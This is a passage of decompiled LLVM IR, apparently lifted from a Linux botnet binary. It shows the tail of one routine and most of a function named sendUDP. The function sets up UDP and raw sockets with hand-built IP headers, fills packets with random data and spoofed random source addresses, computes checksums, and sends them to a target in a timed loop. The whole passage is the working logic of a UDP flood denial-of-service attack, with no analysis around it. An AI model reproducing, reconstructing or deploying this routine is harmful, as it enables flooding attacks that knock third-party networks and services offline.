  %v1_804b2df = call i32 @__libc_close(i32 %v3_804b27a)
  br label %dec_label_pc_804b2e7.backedge

dec_label_pc_804b2e7.backedge:                    ; preds = %dec_label_pc_804b28b, %dec_label_pc_804b268
  %v2_804b2ec = call i32 @__GI_time(i32* null)
  store i32 %v2_804b2ec, i32* @eax, align 4
  %v5_804b2f7 = icmp slt i32 %v2_804b2ec, %v5_804b201
  br i1 %v5_804b2f7, label %dec_label_pc_804b268, label %dec_label_pc_804b2fd

dec_label_pc_804b2fd:                             ; preds = %dec_label_pc_804b2e7.backedge, %dec_label_pc_804b2e7.preheader
  %v1_804b302 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b307

dec_label_pc_804b307:                             ; preds = %dec_label_pc_804b21a, %dec_label_pc_804b2fd
  %v4_804b307 = add nuw nsw i32 %storemerge39, 1
  store i32 %v4_804b307, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804b307, %arg6
  br i1 %exitcond, label %dec_label_pc_804b316, label %dec_label_pc_804b21a

dec_label_pc_804b316:                             ; preds = %dec_label_pc_804b307, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804b307 ]
  store i32 %v0_804b1e3, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v2_804b24a, { 1, 0, 2 }
  uselistorder i32 %v5_804b201, { 1, 0 }
  uselistorder label %dec_label_pc_804b307, { 1, 0 }
  uselistorder label %dec_label_pc_804b268, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp41 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804b31f = load i32, i32* @ebx, align 4
  %v12_804b320 = ptrtoint i32* %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b329 = icmp eq i32 %arg2, 0
  %v1_804b32d = icmp eq i1 %v4_804b329, false
  br i1 %v1_804b32d, label %dec_label_pc_804b33a, label %dec_label_pc_804b32f

dec_label_pc_804b32f:                             ; preds = %entry
  %v1_804b32f = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b352

dec_label_pc_804b33a:                             ; preds = %entry
  %v1_804b33d = urem i32 %arg2, 65536
  store i32 %v1_804b33d, i32* %eax.global-to-local, align 4
  %v1_804b346 = call i32 @htons(i32 %v1_804b33d)
  br label %dec_label_pc_804b352

dec_label_pc_804b352:                             ; preds = %dec_label_pc_804b32f, %dec_label_pc_804b33a
  %v2_804b355 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804b358 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804b358, i32* %eax.global-to-local, align 4
  %v4_804b35f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804b35f, i32* %eax.global-to-local, align 4
  %v1_804b367 = icmp eq i32 %v4_804b35f, 0
  %v1_804b369 = icmp eq i1 %v1_804b367, false
  br i1 %v1_804b369, label %dec_label_pc_804b805, label %dec_label_pc_804b36f

dec_label_pc_804b36f:                             ; preds = %dec_label_pc_804b352
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b388 = icmp eq i32 %arg4, 32
  %v1_804b38c = icmp eq i1 %v9_804b388, false
  br i1 %v1_804b38c, label %dec_label_pc_804b4c4, label %dec_label_pc_804b392

dec_label_pc_804b392:                             ; preds = %dec_label_pc_804b36f
  %v4_804b39b = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804b39b, i32* %eax.global-to-local, align 4
  %v4_804b3a6 = icmp eq i32 %v4_804b39b, 0
  %v1_804b3aa = icmp eq i1 %v4_804b3a6, false
  br i1 %v1_804b3aa, label %dec_label_pc_804b3c7, label %dec_label_pc_804b3ac

dec_label_pc_804b3ac:                             ; preds = %dec_label_pc_804b392
  %v0_804b3ac = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804b3ac, i32* %eax.global-to-local, align 4
  %v3_804b3ba = call i32 @Rootsprintf(i32 %v0_804b3ac, i32 ptrtoint ([27 x i8]* @global_var_80564b0.140 to i32))
  store i32 %v3_804b3ba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b805

dec_label_pc_804b3c7:                             ; preds = %dec_label_pc_804b392
  %v1_804b3ca = add i32 %arg5, 1
  store i32 %v1_804b3ca, i32* %eax.global-to-local, align 4
  %v1_804b3cf = call i32 @malloc(i32 %v1_804b3ca)
  store i32 %v1_804b3cf, i32* %eax.global-to-local, align 4
  %v4_804b3da = icmp eq i32 %v1_804b3cf, 0
  br i1 %v4_804b3da, label %dec_label_pc_804b805, label %dec_label_pc_804b3e4

dec_label_pc_804b3e4:                             ; preds = %dec_label_pc_804b3c7
  store i32 %v1_804b3ca, i32* %edx.global-to-local, align 4
  %v1_804b3ed = inttoptr i32 %v1_804b3cf to i8*
  store i32 %v1_804b3cf, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804b3f2 = and i32 %v1_804b3cf, -256
  store i32 %v1_804b3f2, i32* %eax.global-to-local, align 4
  %v5_804b3f4 = call i8* @_memset(i8* %v1_804b3ed, i32 %v1_804b3f2, i32 %v1_804b3ca)
  %v3_804b3fc = call i32 @makeRandomStr(i8* %v1_804b3ed, i32 %arg5)
  store i32 %v3_804b3fc, i32* %eax.global-to-local, align 4
  %v2_804b409 = call i32 @__GI_time(i32* null)
  %v5_804b411 = add i32 %v2_804b409, %arg3
  store i32 %v5_804b411, i32* %eax.global-to-local, align 4
  %v1_804b498 = mul i32 %arg8, 100
  %v2_804b4a1 = mul i32 %arg8, 1000
  %v1_804b4a8 = sext i32 %v2_804b4a1 to i64
  br label %dec_label_pc_804b427.outer

dec_label_pc_804b427.outer:                       ; preds = %dec_label_pc_804b485, %dec_label_pc_804b4bc, %dec_label_pc_804b3e4
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804b3e4 ], [ 0, %dec_label_pc_804b485 ], [ %v4_804b4bc, %dec_label_pc_804b4bc ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804b3e4 ], [ %v4_804b47a, %dec_label_pc_804b485 ], [ %v4_804b47a, %dec_label_pc_804b4bc ]
  br label %dec_label_pc_804b427

dec_label_pc_804b427:                             ; preds = %dec_label_pc_804b427.outer, %dec_label_pc_804b45b
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804b45b ], [ %stack_var_-92.0.ph, %dec_label_pc_804b427.outer ]
  store i32 %v2_804b355, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804b39b, i32* %stack_var_-156, align 4
  %v7_804b43c = call i32 @__libc_sendto(i32 %v4_804b39b, i32 %v1_804b3cf, i32 %arg5, i32 0, i32 %v2_804b355, i32 16)
  store i32 %v7_804b43c, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b447 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804b44a = icmp eq i1 %v15_804b447, false
  br i1 %v1_804b44a, label %dec_label_pc_804b47a, label %dec_label_pc_804b44c

dec_label_pc_804b44c:                             ; preds = %dec_label_pc_804b427
  br i1 %v1_804b32d, label %dec_label_pc_804b45b, label %dec_label_pc_804b452

dec_label_pc_804b452:                             ; preds = %dec_label_pc_804b44c
  %v0_804b452 = load i32, i32* %stack_var_-156, align 4
  %v1_804b452 = call i32 @rand_cmwc(i32 %v0_804b452)
  store i32 %v1_804b452, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b45b

dec_label_pc_804b45b:                             ; preds = %dec_label_pc_804b44c, %dec_label_pc_804b452
  %v2_804b460 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b460, i32* %eax.global-to-local, align 4
  %v8_804b46b = icmp sgt i32 %v2_804b460, %v5_804b411
  br i1 %v8_804b46b, label %dec_label_pc_804b805, label %dec_label_pc_804b427

dec_label_pc_804b47a:                             ; preds = %dec_label_pc_804b427
  %v4_804b47a = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b480 = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804b483 = icmp eq i1 %v15_804b480, false
  br i1 %v1_804b483, label %dec_label_pc_804b4bc, label %dec_label_pc_804b485

dec_label_pc_804b485:                             ; preds = %dec_label_pc_804b47a
  store i32 %v1_804b498, i32* %edx.global-to-local, align 4
  store i32 %v2_804b4a1, i32* %eax.global-to-local, align 4
  %v2_804b4a8 = call i32 @usleep(i64 %v1_804b4a8)
  store i32 %v2_804b4a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b427.outer

dec_label_pc_804b4bc:                             ; preds = %dec_label_pc_804b47a
  %v4_804b4bc = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804b427.outer

dec_label_pc_804b4c4:                             ; preds = %dec_label_pc_804b36f
  store i32 %v12_804b320, i32* %eax.global-to-local, align 4
  %v4_804b4d2 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804b4d2, i32* %eax.global-to-local, align 4
  %v4_804b4dd = icmp eq i32 %v4_804b4d2, 0
  %v1_804b4e1 = icmp eq i1 %v4_804b4dd, false
  br i1 %v1_804b4e1, label %dec_label_pc_804b4fe, label %dec_label_pc_804b4e3

dec_label_pc_804b4e3:                             ; preds = %dec_label_pc_804b4c4
  %v0_804b4e3 = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804b4e3, i32* %eax.global-to-local, align 4
  %v3_804b4f1 = call i32 @Rootsprintf(i32 %v0_804b4e3, i32 ptrtoint ([27 x i8]* @global_var_80564b0.140 to i32))
  store i32 %v3_804b4f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b802

dec_label_pc_804b4fe:                             ; preds = %dec_label_pc_804b4c4
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b50a = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804b50a, i32* %eax.global-to-local, align 4
  store i32 %v4_804b4d2, i32* %stack_var_-156, align 4
  %v5_804b515 = call i32 @__GI_setsockopt(i32 %v4_804b4d2, i32 0, i32 3, i32 %v2_804b50a, i32 4)
  store i32 %v5_804b515, i32* %eax.global-to-local, align 4
  %v2_804b51d = icmp slt i32 %v5_804b515, 0
  %v1_804b51f = icmp eq i1 %v2_804b51d, false
  br i1 %v1_804b51f, label %dec_label_pc_804b575.preheader, label %dec_label_pc_804b521

dec_label_pc_804b575.preheader:                   ; preds = %dec_label_pc_804b4fe
  br label %dec_label_pc_804b545

dec_label_pc_804b521:                             ; preds = %dec_label_pc_804b4fe
  %v0_804b521 = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804b521, i32* %eax.global-to-local, align 4
  %v3_804b52f = call i32 @Rootsprintf(i32 %v0_804b521, i32 ptrtoint ([33 x i8]* @global_var_80564cc.141 to i32))
  store i32 %v3_804b52f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b802

dec_label_pc_804b545:                             ; preds = %dec_label_pc_804b575.preheader, %dec_label_pc_804b545
  %stack_var_-32.088 = phi i32 [ 50, %dec_label_pc_804b575.preheader ], [ %v4_804b575, %dec_label_pc_804b545 ]
  %v4_804b575 = add nsw i32 %stack_var_-32.088, -1
  %v2_804b54a = call i32 @__GI_time(i32* null)
  store i32 %v2_804b54a, i32* %eax.global-to-local, align 4
  store i32 %v2_804b54a, i32* @ebx, align 4
  %v1_804b554 = call i32 @rand_cmwc(i32 0)
  %v1_804b559 = load i32, i32* @ebx, align 4
  %v2_804b559 = xor i32 %v1_804b559, %v1_804b554
  store i32 %v2_804b559, i32* @eax, align 4
  %v1_804b55f = call i32 @srand(i32 %v2_804b559)
  store i32 %v1_804b55f, i32* @eax, align 4
  %v0_804b567 = call i32 @random()
  store i32 %v0_804b567, i32* %eax.global-to-local, align 4
  %v1_804b56d = call i32 @init_rand(i32 %v0_804b567)
  store i32 %v1_804b56d, i32* %eax.global-to-local, align 4
  %v13_804b578 = icmp eq i32 %v4_804b575, 0
  %v1_804b57c = icmp eq i1 %v13_804b578, false
  br i1 %v1_804b57c, label %dec_label_pc_804b545, label %dec_label_pc_804b57e

dec_label_pc_804b57e:                             ; preds = %dec_label_pc_804b545
  %v4_804b57e = icmp eq i32 %arg4, 0
  %v1_804b582 = icmp eq i1 %v4_804b57e, false
  br i1 %v1_804b582, label %dec_label_pc_804b58d, label %dec_label_pc_804b5a3

dec_label_pc_804b58d:                             ; preds = %dec_label_pc_804b57e
  %v5_804b594 = sub i32 32, %arg4
  %v2_804b59c = urem i32 %v5_804b594, 32
  %v4_804b59c = icmp eq i32 %v2_804b59c, 0
  br i1 %v4_804b59c, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804b58d
  %v5_804b59c = shl i32 1, %v2_804b59c
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804b58d, %bb
  %v0_804b59e = phi i32 [ %v5_804b59c, %bb ], [ 1, %dec_label_pc_804b58d ]
  %v1_804b59e = sub i32 0, %v0_804b59e
  store i32 %v1_804b59e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b5a3

dec_label_pc_804b5a3:                             ; preds = %dec_label_pc_804b57e, %bb84
  %storemerge6 = phi i32 [ %v1_804b59e, %bb84 ], [ 0, %dec_label_pc_804b57e ]
  %v1_804b5a6 = add i32 %arg5, 28
  %v1_804b5b2 = add i32 %arg5, 58
  %v2_804b5b5 = and i32 %v1_804b5b2, -16
  %v2_804b5bb = sub i32 %v12_804b320, %v2_804b5b5
  %v1_804b5c3 = add i32 %v2_804b5bb, 15
  %v2_804b5c6 = and i32 %v1_804b5c3, -16
  %v1_804b5de = add i32 %v2_804b5c6, 20
  %v5_804b5e1 = inttoptr i32 %v1_804b5de to i16*
  %v1_804b5e7 = add i32 %arg5, 8
  store i32 %v1_804b5e7, i32* %eax.global-to-local, align 4
  store i32 %v1_804b5e7, i32* @ebx, align 4
  %v5_804b5ef = add i32 %v2_804b5bb, -16
  %v6_804b5ef = inttoptr i32 %v5_804b5ef to i32*
  store i32 %storemerge6, i32* %v6_804b5ef, align 4
  %v2_804b5f2 = call i32 @GetRandomIP(i32 %v1_804b5a6, i32 %v2_804b5c6)
  store i32 %v2_804b5f2, i32* %eax.global-to-local, align 4
  %v0_804b5f7 = load i32, i32* @esp, align 4
  %v3_804b5fd = inttoptr i32 %v0_804b5f7 to i32*
  store i32 %v2_804b5f2, i32* %v3_804b5fd, align 4
  %v0_804b5fe = call i32 @htonl()
  store i32 %v0_804b5fe, i32* %eax.global-to-local, align 4
  %v0_804b603 = load i32, i32* @esp, align 4
  %v3_804b606 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804b606, i32* %edx.global-to-local, align 4
  %v0_804b60c = load i32, i32* @ebx, align 4
  %v2_804b60c = add i32 %v0_804b603, 8
  %v3_804b60c = inttoptr i32 %v2_804b60c to i32*
  store i32 %v0_804b60c, i32* %v3_804b60c, align 4
  %v1_804b60d = add i32 %v0_804b603, 4
  %v2_804b60d = inttoptr i32 %v1_804b60d to i32*
  store i32 17, i32* %v2_804b60d, align 4
  %v3_804b60f = inttoptr i32 %v0_804b603 to i32*
  store i32 %v0_804b5fe, i32* %v3_804b60f, align 4
  %v0_804b610 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b610 = add i32 %v0_804b603, -4
  %v3_804b610 = inttoptr i32 %v2_804b610 to i32*
  store i32 %v0_804b610, i32* %v3_804b610, align 4
  %v5_804b611 = add i32 %v0_804b603, -8
  %v6_804b611 = inttoptr i32 %v5_804b611 to i32*
  store i32 %v2_804b5c6, i32* %v6_804b611, align 4
  %v0_804b614 = call i32 @makeIPPacket()
  %v0_804b619 = load i32, i32* @esp, align 4
  %v1_804b622 = urem i32 %v1_804b5e7, 65536
  store i32 %v1_804b622, i32* %eax.global-to-local, align 4
  %v2_804b62a = add i32 %v0_804b619, 8
  %v3_804b62a = inttoptr i32 %v2_804b62a to i32*
  store i32 %v1_804b622, i32* %v3_804b62a, align 4
  %v2_804b62b = call i32 @htons(i32 %v1_804b5de)
  %v3_804b62b = trunc i32 %v2_804b62b to i16
  %sext7 = mul i32 %v2_804b62b, 65536
  %v1_804b633 = sdiv i32 %sext7, 65536
  store i32 %v1_804b633, i32* %edx.global-to-local, align 4
  store i32 %v1_804b5de, i32* %eax.global-to-local, align 4
  %v3_804b638 = add i32 %v2_804b5c6, 24
  %v4_804b638 = inttoptr i32 %v3_804b638 to i16*
  store i16 %v3_804b62b, i16* %v4_804b638, align 8
  %v2_804b63c = call i32 @rand_cmwc(i32 %v1_804b5de)
  %sext = mul i32 %v2_804b63c, 65536
  %v1_804b641 = sdiv i32 %sext, 65536
  store i32 %v1_804b641, i32* %edx.global-to-local, align 4
  store i32 %v1_804b5de, i32* %eax.global-to-local, align 4
  %v1_804b646 = trunc i32 %v1_804b641 to i16
  store i16 %v1_804b646, i16* %v5_804b5e1, align 4
  br i1 %v1_804b32d, label %dec_label_pc_804b65a, label %dec_label_pc_804b64f

dec_label_pc_804b64f:                             ; preds = %dec_label_pc_804b5a3
  %v2_804b64f = call i32 @rand_cmwc(i32 %v1_804b5de)
  store i32 %v2_804b64f, i32* %eax.global-to-local, align 4
  %.pre37 = urem i32 %arg2, 65536
  br label %dec_label_pc_804b672

dec_label_pc_804b65a:                             ; preds = %dec_label_pc_804b5a3
  %v1_804b65d = urem i32 %arg2, 65536
  store i32 %v1_804b65d, i32* %eax.global-to-local, align 4
  %v0_804b662 = load i32, i32* @esp, align 4
  %v2_804b665 = add i32 %v0_804b662, -16
  %v3_804b665 = inttoptr i32 %v2_804b665 to i32*
  store i32 %v1_804b65d, i32* %v3_804b665, align 4
  %v1_804b666 = sext i16 %tmp41 to i32
  %v2_804b666 = call i32 @htons(i32 %v1_804b666)
  store i32 %v2_804b666, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b672

dec_label_pc_804b672:                             ; preds = %dec_label_pc_804b64f, %dec_label_pc_804b65a
  %v1_804b71d.pre-phi = phi i32 [ %.pre37, %dec_label_pc_804b64f ], [ %v1_804b65d, %dec_label_pc_804b65a ]
  %storemerge5.in = phi i32 [ %v2_804b64f, %dec_label_pc_804b64f ], [ %v2_804b666, %dec_label_pc_804b65a ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804b675 = sdiv i32 %sext8, 65536
  store i32 %v4_804b675, i32* %edx.global-to-local, align 4
  %v3_804b678 = add i32 %v2_804b5c6, 22
  %v4_804b678 = inttoptr i32 %v3_804b678 to i16*
  store i16 %storemerge5, i16* %v4_804b678, align 2
  %v1_804b67f = add i32 %v2_804b5c6, 26
  %v2_804b67f = inttoptr i32 %v1_804b67f to i16*
  store i16 0, i16* %v2_804b67f, align 2
  %v1_804b688 = add i32 %v2_804b5c6, 28
  store i32 %v1_804b688, i32* %eax.global-to-local, align 4
  %v4_804b68b = load i32, i32* @esp, align 4
  %v5_804b68b = add i32 %v4_804b68b, -4
  %v6_804b68b = inttoptr i32 %v5_804b68b to i32*
  store i32 %arg5, i32* %v6_804b68b, align 4
  %v0_804b68e = load i32, i32* %eax.global-to-local, align 4
  %v2_804b68e = add i32 %v4_804b68b, -8
  %v3_804b68e = inttoptr i32 %v2_804b68e to i32*
  store i32 %v0_804b68e, i32* %v3_804b68e, align 4
  %v3_804b68f = inttoptr i32 %v4_804b675 to i8*
  %v4_804b68f = call i32 @makeRandomStr(i8* %v3_804b68f, i32 %v12_804b320)
  %v0_804b694 = load i32, i32* @esp, align 4
  store i32 %v2_804b5c6, i32* %eax.global-to-local, align 4
  %v1_804b69a = or i32 %v2_804b5c6, 2
  %v2_804b69a = inttoptr i32 %v1_804b69a to i16*
  %v3_804b69a = load i16, i16* %v2_804b69a, align 2
  %v4_804b69a = zext i16 %v3_804b69a to i32
  store i32 %v4_804b69a, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5c6, i32* %eax.global-to-local, align 4
  %v2_804b6a9 = add i32 %v0_804b694, 4
  %v3_804b6a9 = inttoptr i32 %v2_804b6a9 to i32*
  store i32 %v4_804b69a, i32* %v3_804b6a9, align 4
  %v0_804b6aa = load i32, i32* %eax.global-to-local, align 4
  %v3_804b6aa = inttoptr i32 %v0_804b694 to i32*
  store i32 %v0_804b6aa, i32* %v3_804b6aa, align 4
  %v3_804b6ab = inttoptr i32 %v4_804b675 to i16*
  %v4_804b6ab = call i32 @csum(i16* %v3_804b6ab, i32 %v12_804b320)
  %v5_804b6ab = trunc i32 %v4_804b6ab to i16
  %sext11 = mul i32 %v4_804b6ab, 65536
  %v1_804b6b3 = sdiv i32 %sext11, 65536
  store i32 %v1_804b6b3, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5c6, i32* %eax.global-to-local, align 4
  %v3_804b6b8 = or i32 %v2_804b5c6, 10
  %v4_804b6b8 = inttoptr i32 %v3_804b6b8 to i16*
  store i16 %v5_804b6ab, i16* %v4_804b6b8, align 2
  %v0_804b6bc = load i32, i32* @esp, align 4
  %v1_804b6bf = add i32 %v0_804b6bc, -16
  %v2_804b6bf = inttoptr i32 %v1_804b6bf to i32*
  store i32 0, i32* %v2_804b6bf, align 4
  %v2_804b6c1 = inttoptr i32 %v4_804b675 to i32*
  %v3_804b6c1 = call i32 @__GI_time(i32* %v2_804b6c1)
  %v0_804b6c6 = load i32, i32* @esp, align 4
  %v1_804b6c6 = add i32 %v0_804b6c6, 16
  %v5_804b6c9 = add i32 %v3_804b6c1, %arg3
  store i32 %v5_804b6c9, i32* %eax.global-to-local, align 4
  %v3_804b747 = or i32 %v2_804b5c6, 4
  %v4_804b747 = inttoptr i32 %v3_804b747 to i16*
  %v2_804b76a = or i32 %v2_804b5c6, 12
  %v3_804b76a = inttoptr i32 %v2_804b76a to i32*
  %v1_804b7d6 = mul i32 %arg8, 100
  %v2_804b7df = mul i32 %arg8, 1000
  br label %dec_label_pc_804b6df.outer

dec_label_pc_804b6df.outer:                       ; preds = %dec_label_pc_804b7c3, %dec_label_pc_804b7fa, %dec_label_pc_804b672
  %v0_804b6e5.pre = phi i32 [ %v1_804b6c6, %dec_label_pc_804b672 ], [ %v1_804b7eb, %dec_label_pc_804b7c3 ], [ %v0_804b6e5.pre.pre.pre, %dec_label_pc_804b7fa ]
  %stack_var_-102.0.ph = phi i16 [ %tmp, %dec_label_pc_804b672 ], [ %storemerge, %dec_label_pc_804b7c3 ], [ %storemerge, %dec_label_pc_804b7fa ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804b672 ], [ 0, %dec_label_pc_804b7c3 ], [ %v4_804b7fa, %dec_label_pc_804b7fa ]
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804b672 ], [ %v4_804b7b8, %dec_label_pc_804b7c3 ], [ %v4_804b7b8, %dec_label_pc_804b7fa ]
  br label %dec_label_pc_804b6df

dec_label_pc_804b6df:                             ; preds = %dec_label_pc_804b6df.outer, %dec_label_pc_804b79a
  %v0_804b6e5 = phi i32 [ %v1_804b7a4, %dec_label_pc_804b79a ], [ %v0_804b6e5.pre, %dec_label_pc_804b6df.outer ]
  %stack_var_-102.0 = phi i16 [ %storemerge, %dec_label_pc_804b79a ], [ %stack_var_-102.0.ph, %dec_label_pc_804b6df.outer ]
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804b79a ], [ %stack_var_-84.0.ph, %dec_label_pc_804b6df.outer ]
  store i32 %v2_804b355, i32* %eax.global-to-local, align 4
  store i32 %v2_804b5c6, i32* %edx.global-to-local, align 4
  %v1_804b6e8 = add i32 %v0_804b6e5, -12
  %v2_804b6e8 = inttoptr i32 %v1_804b6e8 to i32*
  store i32 16, i32* %v2_804b6e8, align 4
  %v2_804b6ea = add i32 %v0_804b6e5, -16
  %v3_804b6ea = inttoptr i32 %v2_804b6ea to i32*
  store i32 %v2_804b355, i32* %v3_804b6ea, align 4
  %v1_804b6eb = add i32 %v0_804b6e5, -20
  %v2_804b6eb = inttoptr i32 %v1_804b6eb to i32*
  store i32 0, i32* %v2_804b6eb, align 4
  %v5_804b6ed = add i32 %v0_804b6e5, -24
  %v6_804b6ed = inttoptr i32 %v5_804b6ed to i32*
  store i32 %v1_804b5a6, i32* %v6_804b6ed, align 4
  %v0_804b6f0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b6f0 = add i32 %v0_804b6e5, -28
  %v3_804b6f0 = inttoptr i32 %v2_804b6f0 to i32*
  store i32 %v0_804b6f0, i32* %v3_804b6f0, align 4
  %v5_804b6f1 = add i32 %v0_804b6e5, -32
  %v6_804b6f1 = inttoptr i32 %v5_804b6f1 to i32*
  store i32 %v4_804b4d2, i32* %v6_804b6f1, align 4
  %v6_804b6f4 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804b6f4, i32* %eax.global-to-local, align 4
  %v1_804b6fc = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %sext3 = mul i32 %v1_804b6fc, 65536
  %v1_804b701 = sdiv i32 %sext3, 65536
  store i32 %v1_804b701, i32* %edx.global-to-local, align 4
  store i32 %v1_804b5de, i32* %eax.global-to-local, align 4
  %v1_804b706 = trunc i32 %v1_804b701 to i16
  store i16 %v1_804b706, i16* %v5_804b5e1, align 4
  br i1 %v1_804b32d, label %dec_label_pc_804b71a, label %dec_label_pc_804b70f

dec_label_pc_804b70f:                             ; preds = %dec_label_pc_804b6df
  %v1_804b70f = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804b732

dec_label_pc_804b71a:                             ; preds = %dec_label_pc_804b6df
  store i32 %v1_804b71d.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804b722 = load i32, i32* @esp, align 4
  %v2_804b725 = add i32 %v0_804b722, -16
  %v3_804b725 = inttoptr i32 %v2_804b725 to i32*
  store i32 %v1_804b71d.pre-phi, i32* %v3_804b725, align 4
  %v1_804b726 = sext i16 %stack_var_-102.0 to i32
  %v2_804b726 = call i32 @htons(i32 %v1_804b726)
  br label %dec_label_pc_804b732

dec_label_pc_804b732:                             ; preds = %dec_label_pc_804b70f, %dec_label_pc_804b71a
  %storemerge.in = phi i32 [ %v1_804b70f, %dec_label_pc_804b70f ], [ %v2_804b726, %dec_label_pc_804b71a ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b5de, i32* %eax.global-to-local, align 4
  %v4_804b735 = urem i32 %storemerge.in, 65536
  %v5_804b735 = load i32, i32* %edx.global-to-local, align 4
  %v6_804b735 = and i32 %v5_804b735, -65536
  %v7_804b735 = or i32 %v6_804b735, %v4_804b735
  store i32 %v7_804b735, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804b678, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804b73d = sdiv i32 %sext13, 65536
  %v2_804b73d = call i32 @rand_cmwc(i32 %v1_804b73d)
  %sext4 = mul i32 %v2_804b73d, 65536
  %v1_804b742 = sdiv i32 %sext4, 65536
  store i32 %v1_804b742, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5c6, i32* %eax.global-to-local, align 4
  %v1_804b747 = trunc i32 %v1_804b742 to i16
  store i16 %v1_804b747, i16* %v4_804b747, align 4
  %v0_804b74b = load i32, i32* @esp, align 4
  %v5_804b74e = add i32 %v0_804b74b, -16
  %v6_804b74e = inttoptr i32 %v5_804b74e to i32*
  store i32 %storemerge6, i32* %v6_804b74e, align 4
  %v3_804b751 = call i32 @GetRandomIP(i32 %v1_804b73d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804b751, i32* %eax.global-to-local, align 4
  %v0_804b756 = load i32, i32* @esp, align 4
  %v3_804b75c = inttoptr i32 %v0_804b756 to i32*
  store i32 %v3_804b751, i32* %v3_804b75c, align 4
  %v0_804b75d = call i32 @htonl()
  store i32 %v0_804b75d, i32* %edx.global-to-local, align 4
  store i32 %v0_804b75d, i32* %v3_804b76a, align 4
  store i32 %v2_804b5c6, i32* %eax.global-to-local, align 4
  %v3_804b770 = load i16, i16* %v2_804b69a, align 2
  %v4_804b770 = zext i16 %v3_804b770 to i32
  store i32 %v4_804b770, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5c6, i32* %eax.global-to-local, align 4
  %v1_804b77f = load i32, i32* @esp, align 4
  %v2_804b77f = add i32 %v1_804b77f, -4
  %v3_804b77f = inttoptr i32 %v2_804b77f to i32*
  store i32 %v4_804b770, i32* %v3_804b77f, align 4
  %v0_804b780 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b780 = add i32 %v1_804b77f, -8
  %v3_804b780 = inttoptr i32 %v2_804b780 to i32*
  store i32 %v0_804b780, i32* %v3_804b780, align 4
  %v3_804b781 = inttoptr i32 %v1_804b73d to i16*
  %v4_804b781 = call i32 @csum(i16* %v3_804b781, i32 ptrtoint (i32* @0 to i32))
  %v5_804b781 = trunc i32 %v4_804b781 to i16
  %sext16 = mul i32 %v4_804b781, 65536
  %v1_804b789 = sdiv i32 %sext16, 65536
